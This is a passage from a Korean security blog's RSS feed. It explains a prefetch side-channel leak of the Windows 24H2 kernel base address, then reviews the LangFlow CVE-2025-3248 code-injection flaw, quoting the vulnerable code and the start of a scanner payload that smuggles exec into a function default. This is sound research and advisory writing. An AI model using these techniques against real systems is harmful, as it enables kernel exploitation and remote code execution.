&#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>entry_SYSCALL_64</code>&#xAC00; &#xC720;&#xC800;&#xBAA8;&#xB4DC;-&#xCEE4;&#xB110;&#xBAA8;&#xB4DC; &#xC804;&#xD658;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xBBC0;&#xB85C; KPTI&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB294; &#xC810;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xB294; &#xAC70;&#xC8E0;.</p><p>x86_64 &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xB294; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C; &#x2194; &#xAC00;&#xC0C1;&#xC8FC;&#xC18C; &#xB9E4;&#xD551; &#xC2DC; &#xC790;&#xC8FC; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; TLB(Translation Lookaside Buffer) &#xCE90;&#xC2DC;&#xAC00; &#xC788;&#xC73C;&#xBA70;, CPU &#xCE90;&#xC2DC;&#xC5D0; &#xC8FC;&#xC18C;&#xB97C; &#xBBF8;&#xB9AC; &#xAC00;&#xC838;&#xC624;&#xB294; prefetch instruction &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD574; prefetch &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xAC00; &#xC774;&#xBBF8; TLB&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74;? &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xAC80;&#xC0C9;&#xD574; &#xBB3C;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xB9E4;&#xD551;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC778; page table walk&#xB97C; &#xC0DD;&#xB7B5;&#xD558;&#xACE0; TLB&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB418;&#xB2C8; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC774; &#xBE68;&#xB77C;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image9.png" alt="image9.png"></p><blockquote><p>&#xD398;&#xC774;&#xC9C0;&#xC758; &#xCE90;&#xC2F1; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB978; &#xC2E4;&#xD589;&#xC18D;&#xB3C4; &#xCC28;&#xC774;&#xB97C; &#xB098;&#xD0C0;&#xB0B8; &#xADF8;&#xB798;&#xD504;<br>&#xCD9C;&#xCC98;: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><p>&#xC774;&#xB7EC;&#xD55C; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xC758; &#xCC28;&#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; exploit&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>syscall&#xC744; &#xC5EC;&#xB7EC; &#xBC88; &#xC218;&#xD589;&#xD558;&#xC5EC; <code>entry_SYSCALL_64</code> &#xC8FC;&#xC18C;&#xAC00; TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4EC;</li><li>&#xC608;&#xC0C1; &#xAC00;&#xB2A5;&#xD55C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xC5D0; &#xB300;&#xD574; prefetch instruction&#xC744; &#xD638;&#xCD9C;&#xD568;<ol><li>0xffffffff80000000 - 0xffffffffc0000000</li></ol></li><li>&#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xB290;&#xB9AC;&#xB2E4;&#xBA74;, TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBBC0;&#xB85C; 2&#xB85C; &#xB3CC;&#xC544;&#xAC00; &#xBC18;&#xBCF5;</li><li>&#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xBE60;&#xB974;&#xB2E4;&#xBA74;, &#xCE90;&#xC2DC;&#xB41C; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xC778; <code>entry_SYSCALL_64</code> &#xC774;&#xBBC0;&#xB85C; &#xC624;&#xD504;&#xC14B; &#xACC4;&#xC0B0;&#xC744; &#xD1B5;&#xD574; KASLR &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD568;</li></ol><p><img src="image10.png" alt="image10.png"></p><blockquote><p>&#xCE90;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC758; prefetch &#xBA85;&#xB839;&#xC5B4; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xC774;&#xC6A9;&#xD55C; KASLR Leak &#xACFC;&#xC815;<br>&#xCD9C;&#xCC98;: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><h3 id="Bypassing-KASLR-mitigation-in-24H2"><a href="#Bypassing-KASLR-mitigation-in-24H2" class="headerlink" title="Bypassing KASLR mitigation in 24H2"></a>Bypassing KASLR mitigation in 24H2</h3><p>&#xC55E;&#xC11C; EntryBleed&#xC758; prefetch sidechannel &#xAE30;&#xBC95;&#xC744; Windows&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!</p><p>Windows&#xC5D0;&#xB3C4; KPTI&#xC640; &#xC720;&#xC0AC;&#xD55C; &#xAC1C;&#xB150;&#xC758; mitigation&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Meltdown, Spectre &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xC2DC;&#xAE30; MS&#xB3C4; &#xC5ED;&#xC2DC; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xD654;&#xD558;&#xAE30; &#xC704;&#xD574; &#xCEE4;&#xB110;-&#xC720;&#xC800; &#xAC04; &#xBA54;&#xBAA8;&#xB9AC; &#xACA9;&#xB9AC; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC744; &#xCD94;&#xAC00;&#xD588;&#xB294;&#xB370;, &#xADF8;&#xAC8C; &#xBC14;&#xB85C;  <strong>KVA(Kernel Virtual Address) Shadow</strong>&#xB77C;&#xB294; &#xB140;&#xC11D;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; KVAS&#xB294; &#xCD5C;&#xADFC; Windows &#xBE4C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p><img src="image11.png" alt="image11.png"></p><p>KVAS&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>KPROCESS.userdirectorytablebase</code> &#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xC8FC;&#xC18C; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, 0&#xC778; &#xAC78; &#xBCF4;&#xC544; &#xBE44;&#xD65C;&#xC131;&#xD654; &#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB124;&#xC694;. &#xCD5C;&#xADFC; Windows &#xC758; &#xCD5C;&#xC18C; &#xC694;&#xAD6C;&#xC0AC;&#xD56D;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB294; Meltdown&#xACFC; Spectre&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xC73C;&#xB2C8; &#xC131;&#xB2A5; &#xC800;&#xD558;&#xB97C; &#xC77C;&#xC73C;&#xD0A4;&#xB294; KVAS&#xB97C; &#xAD73;&#xC774; &#xC801;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB41C;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xD55C; &#xAC8C; &#xC544;&#xB2D0;&#xAE4C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xBB34;&#xD2BC;! KVAS&#xAC00; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xB294; &#xAC74; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xAC00; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC774;&#xACA0;&#xC8E0;? &#xADF8;&#xB7FC; EntryBleed&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB41C; prefetch &#xAE30;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. exploits-forsale&#xC5D0;&#xC11C; &#xACF5;&#xAC1C;&#xD55C; PoC &#xC911; sidechannel Procedure&#xB97C; &#xBD84;&#xC11D;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image12.png" alt="image12.png"></p><blockquote><p><a href="https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm">https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm</a></p></blockquote><ul><li>&#xC8FC;&#xD669;&#xC0C9; &#xBC15;&#xC2A4;<ul><li>prefetch&#xD560; &#xCCAB; &#xBC88;&#xC9F8; argument(rcx) &#xBC1B;&#xC74C;</li></ul></li><li>&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;<ul><li><strong>prefetchnta&#xC744; &#xD1B5;&#xD574;</strong> non-temporal&#xC784;&#xC744; &#xBA85;&#xC2DC;&#xD558;&#xACE0;, <strong>prefetcht2</strong>&#xC744; &#xD1B5;&#xD574; &#xD53C;&#xC5F0;&#xC0B0;&#xC790; &#xC8FC;&#xC18C;&#xB97C; Level 2 &#xCE90;&#xC2DC;&#xB85C; &#xB85C;&#xB4DC;&#xD568;</li><li>&#xC704; &#xB450; &#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;&#xC758; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xACE0; TLB&#xC5D0; &#xCE90;&#xC2DC;&#xB41C; &#xC8FC;&#xC18C;&#xC778;&#xC9C0; &#xD310;&#xB2E8;&#xD568;</li></ul></li><li>&#xD30C;&#xB780;&#xC0C9; &#xBC15;&#xC2A4;<ul><li>&#xBE68;&#xAC04;&#xC0C9; &#xBC15;&#xC2A4;&#xC758; &#xC2E4;&#xD589; &#xC2DC;&#xAC04;&#xC744; &#xCE21;&#xC815;&#xD558;&#xAE30; &#xC704;&#xD574; lfence/mfence &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD65C;&#xC6A9;&#xD568;</li><li>instruction &#xC9C1;&#xB82C;&#xD654; &#xC791;&#xC5C5;&#xC744; &#xD1B5;&#xD574; &#xC2E4;&#xD589; &#xC2DC;&#xAC04; &#xCE21;&#xC815;(lfence, mfence)<ul><li>&#xC774;&#xC804;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xBAA8;&#xB450; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xC9C4;&#xC785;</li><li>Instruction &#xC2E4;&#xD589; &#xC21C;&#xC11C; &#xAC15;&#xC81C;, &#xCD5C;&#xC801;&#xD654; &#xC81C;&#xAC70;</li></ul></li></ul></li></ul><p><img src="image13.png" alt="image13.png"></p><p>&#xC81C; &#xD658;&#xACBD;&#xC778; 13&#xC138;&#xB300; Intel &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xB2E8; &#xBA87; &#xCD08; &#xB9CC;&#xC5D0; ntoskrnl.exe &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC; &#xC774; &#xBC29;&#xBC95;&#xB3C4; &#xBA87; &#xAC00;&#xC9C0; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC774; &#xC788;&#xB294;&#xB370;&#xC694;.</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB294; &#xCD5C;&#xC2E0; intel&#xC758; &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB9CC; reliable&#xD558;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xACE0; AMD &#xD504;&#xB85C;&#xC138;&#xC11C;&#xC5D0;&#xC11C;&#xB294; &#xC2E0;&#xB8B0;&#xC131;&#xC774; &#xADF8;&#xB2E5; &#xB192;&#xC9C0; &#xC54A;&#xB2E4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xC788;&#xC73C;&#xBA70;, &#xB450; &#xBC88;&#xC9F8;&#xB85C;&#xB294; &#xC5EC;&#xB7EC; &#xCEE4;&#xB110; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;(KTHRED, Pool) &#xC8FC;&#xC18C;&#xB3C4; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xAE30;&#xC874;&#xC758; <code>NtQuerySystemInformation</code> &#xBC29;&#xBC95;&#xC5D0; &#xBE44;&#xD574; &#xCEE4;&#xB110; &#xC774;&#xBBF8;&#xC9C0; &#xBCA0;&#xC774;&#xC2A4; &#xC8FC;&#xC18C;&#xB9CC; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC6A9;&#xB3C4;&#xAC00; &#xB5A8;&#xC5B4;&#xC9C4;&#xB2E4;&#xB294; &#xB2E8;&#xC810;&#xB3C4; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xACB0;&#xAD6D; 24H2&#xC5D0; &#xCD94;&#xAC00;&#xB41C; <code>NtQuerySystemInformaton</code> &#xAD8C;&#xD55C; &#xC81C;&#xD55C;&#xC740; &#xCEE4;&#xB110; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xC0C1;&#xB2F9;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xC5C8;&#xB2E4;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. <del>+ &#xC55E;&#xC73C;&#xB85C; &#xCEE4;&#xB110;&#xD558;&#xB824;&#xBA74; CPU &#xB9E4;&#xB274;&#xC5BC;&#xC744; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBD10;&#xC57C;&#xD558;&#xB294;&#xAC74;&#xAC00;..</del></p><h2 id="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;</h2><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows Kernel Exploit&#xC758; &#xAD6D;&#xBC25;&#xC774;&#xC5C8;&#xB358; <code>NtQuerySystemInformaton</code> &#xAD8C;&#xD55C; &#xD328;&#xCE58;&#xC640;, &#xADF8;&#xB85C; &#xC778;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; KASLR bypass &#xD14C;&#xD06C;&#xB2C9;&#xC758; &#xD544;&#xC694;&#xC131;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xB4F1;&#xC7A5;&#xD55C; sidechannel&#xC744; &#xD65C;&#xC6A9;&#xD55C; Kernel Leak &#xAE30;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC1C;&#xC778;&#xC801;&#xC778; &#xC758;&#xACAC;&#xC73C;&#xB85C;&#xB294; &#xADF8;&#xB3D9;&#xC548; Windows&#xC758; KASLR &#xC6B0;&#xD68C; &#xC5F0;&#xAD6C;&#xAC00; <code>NtQuerySystemInformaton</code> &#xC758; &#xC874;&#xC7AC; &#xB54C;&#xBB38;&#xC5D0; &#xD65C;&#xBC1C;&#xD558;&#xAC8C; &#xC5F0;&#xAD6C;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC9C0;&#xB9CC;, &#xC774;&#xBC88; 24H2&#xB85C; &#xAD8C;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xC0DD;&#xAE30;&#xBA74;&#xC11C; &#xC55E;&#xC73C;&#xB85C; &#xC0C8;&#xB85C;&#xC6B4; &#xC6B0;&#xD68C; &#xBC29;&#xBC95;&#xC774; &#xC5F0;&#xAD6C;&#xB418;&#xAE38; &#xAE30;&#xB300;&#xD560; &#xC218;&#xB3C4; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; I/O Ring exploit&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></p><p><a href="https://exploits.forsale/24h2-nt-exploit/">https://exploits.forsale/24h2-nt-exploit/</a></p><p><a href="https://github.com/exploits-forsale/prefetch-tool">https://github.com/exploits-forsale/prefetch-tool</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kaslr/">kaslr</category>
      
      <category domain="https://hackyboiz.github.io/tags/entrybleed/">entrybleed</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-3248: LangFlow Code Injection Vulnerability</title>
      <link>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/mungsul/2025-04-12/</guid>
      <pubDate>Sun, 13 Apr 2025 02:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/xuemian168/CVE-2025-3248/&quot;&gt;https</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://github.com/xuemian168/CVE-2025-3248/">https://github.com/xuemian168/CVE-2025-3248/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LangFlow &lt; 1.3.0 </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>AI &#xC5D0;&#xC774;&#xC804;&#xD2B8; &#xBE4C;&#xB4DC; &#xBC0F; &#xBC30;&#xD3EC; &#xB3C4;&#xAD6C;&#xC778; LangFlow &#xC5D0;&#xC11C; Code Injection &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>LLM &#xC774; &#xC0DD;&#xC131;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xAC80;&#xC99D;&#xD558;&#xB294; API &#xC778; <code>/api/v1/validate/code</code> &#xC5D0;&#xC11C; <code>exec</code> &#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xD568;&#xC218;&#xC778; <code>validate_code()</code> &#xB97C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; API &#xB97C; &#xC544;&#xBB34;&#xB098; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xAE30;&#xC5D0; [1], &#xD604;&#xC7AC; &#xC0AC;&#xC6A9;&#xC790;&#xB9CC; &#xC774;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. [2]</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> APIRouter, HTTPException<span class="hljs-keyword">from</span> loguru <span class="hljs-keyword">import</span> logger<span class="hljs-keyword">from</span> langflow.api.v1.base <span class="hljs-keyword">import</span> Code, CodeValidationResponse, PromptValidationResponse, ValidatePromptRequest<span class="hljs-keyword">from</span> langflow.base.prompts.api_utils <span class="hljs-keyword">import</span> process_prompt_template<span class="hljs-keyword">from</span> langflow.utils.validate <span class="hljs-keyword">import</span> validate_code<span class="hljs-comment"># build router</span>router = APIRouter(prefix=<span class="hljs-string">&quot;/validate&quot;</span>, tags=[<span class="hljs-string">&quot;Validate&quot;</span>])<span class="hljs-meta">@router.post(&quot;/code&quot;, status_code=200)</span>-<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_validate_code</span>(<span class="hljs-params">code: Code</span>) -&gt; CodeValidationResponse:</span> <span class="hljs-comment"># [1]</span>+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post_validate_code</span>(<span class="hljs-params">code: Code, current_user: CurrentActiveUser</span>) -&gt; CodeValidationResponse:</span> [<span class="hljs-number">2</span>]    <span class="hljs-keyword">try</span>:        errors = validate_code(code.code)        <span class="hljs-keyword">return</span> CodeValidationResponse(            imports=errors.get(<span class="hljs-string">&quot;imports&quot;</span>, {}),            function=errors.get(<span class="hljs-string">&quot;function&quot;</span>, {}),        )    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error validating code&quot;</span>)        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">500</span>, detail=str(e)) <span class="hljs-keyword">from</span> e</code></pre><p><code>validate_code()</code> &#xB294; POST &#xB85C; &#xC804;&#xB2EC;&#xBC1B;&#xC740; <code>code</code> &#xC5D0; import &#xBB38;&#xACFC; python &#xD568;&#xC218; &#xC120;&#xC5B8;&#xBB38;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778; &#xD558;&#xC5EC; import &#xBB38;&#xC774; &#xC788;&#xB294; &#xACBD;&#xC6B0; &#xC774;&#xB984;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xBAA8;&#xB4C8;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; [3] , &#xD568;&#xC218;&#xAC00; &#xC120;&#xC5B8;&#xB418;&#xC5C8;&#xC744; &#xACBD;&#xC6B0; <code>exec</code> &#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. [4]</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">validate_code</span>(<span class="hljs-params">code</span>):</span>    <span class="hljs-comment"># Initialize the errors dictionary</span>    errors = {<span class="hljs-string">&quot;imports&quot;</span>: {<span class="hljs-string">&quot;errors&quot;</span>: []}, <span class="hljs-string">&quot;function&quot;</span>: {<span class="hljs-string">&quot;errors&quot;</span>: []}}    <span class="hljs-comment"># Parse the code string into an abstract syntax tree (AST)</span>    <span class="hljs-keyword">try</span>:        tree = ast.parse(code)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># noqa: BLE001</span>        <span class="hljs-keyword">if</span> hasattr(logger, <span class="hljs-string">&quot;opt&quot;</span>):            logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error parsing code&quot;</span>)        <span class="hljs-keyword">else</span>:            logger.debug(<span class="hljs-string">&quot;Error parsing code&quot;</span>)        errors[<span class="hljs-string">&quot;function&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))        <span class="hljs-keyword">return</span> errors    <span class="hljs-comment"># Add a dummy type_ignores field to the AST</span>    add_type_ignores()    tree.type_ignores = []    <span class="hljs-comment"># Evaluate the import statements</span>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> tree.body:        <span class="hljs-keyword">if</span> isinstance(node, ast.Import):            <span class="hljs-keyword">for</span> alias <span class="hljs-keyword">in</span> node.names:                <span class="hljs-keyword">try</span>:                    importlib.import_module(alias.name) <span class="hljs-comment"># [3]</span>                <span class="hljs-keyword">except</span> ModuleNotFoundError <span class="hljs-keyword">as</span> e:                    errors[<span class="hljs-string">&quot;imports&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))    <span class="hljs-comment"># Evaluate the function definition</span>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> tree.body:        <span class="hljs-keyword">if</span> isinstance(node, ast.FunctionDef):            code_obj = compile(ast.Module(body=[node], type_ignores=[]), <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)            <span class="hljs-keyword">try</span>:                exec(code_obj) <span class="hljs-comment"># [4]</span>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:  <span class="hljs-comment"># noqa: BLE001</span>                logger.opt(exception=<span class="hljs-literal">True</span>).debug(<span class="hljs-string">&quot;Error executing function code&quot;</span>)                errors[<span class="hljs-string">&quot;function&quot;</span>][<span class="hljs-string">&quot;errors&quot;</span>].append(str(e))</code></pre><p>&#xACF5;&#xAC1C;&#xB41C; CVE-2025-3248 &#xC2A4;&#xCE90;&#xB108;(<a href="https://github.com/xuemian168/CVE-2025-3248/">link</a>)&#xC5D0;&#xC11C;&#xB294; &#xC704; &#xADDC;&#xCE59;&#xC5D0; &#xB9DE;&#xAC8C; python &#xD568;&#xC218;&#xB97C; &#xC120;&#xC5B8;&#xD558;&#xBA70; &#xC2DC;&#xC2A4;&#xD15C; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAD6C;&#xBB38;&#xC744; &#xC0BD;&#xC785;&#xD55C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. [5]</p><pre><code class="hljs python"><span class="hljs-comment"># &#xC2A4;&#xCE90;&#xB108; &#xCF54;&#xB4DC; &#xC77C;&#xBD80; &#xBC1C;&#xCDCC;</span>...    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_vulnerability</span>(<span class="hljs-params">self</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;Check if target is vulnerable to Langflow vulnerability&quot;&quot;&quot;</span>        <span class="hljs-keyword">try</span>:            validate_url = urljoin(self.url, <span class="hljs-string">&apos;/api/v1/validate/code&apos;</span>)            payload = {                <span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">def test(cd=exec(&apos;raise 